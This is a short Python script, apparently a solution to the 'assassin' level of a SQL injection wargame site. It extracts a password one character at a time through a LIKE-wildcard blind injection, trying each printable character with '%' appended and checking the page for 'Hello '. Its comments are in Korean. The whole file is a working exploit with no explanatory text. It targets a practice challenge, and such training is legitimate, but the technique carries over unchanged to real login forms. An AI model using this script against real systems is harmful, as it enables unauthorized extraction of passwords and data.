import string
from requests import get

memori = 8
memoria = ''
time = string.digits + string.ascii_letters+ string.punctuation + string.whitespace
URL = "https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php"
cookies = dict(PHPSESSID="??")

for Attack in range(1, memori+1):
    for a in time:
        print(str(a) + " 대입갑니다잉~")
        ria = "?pw="+memoria+a+"%"
        drute = URL + ria
        huha = get(drute, cookies=cookies)

        if huha.text.__contains__("Hello "):
            print(a+"발견!")
            memoria += a
            break

print(memoria)

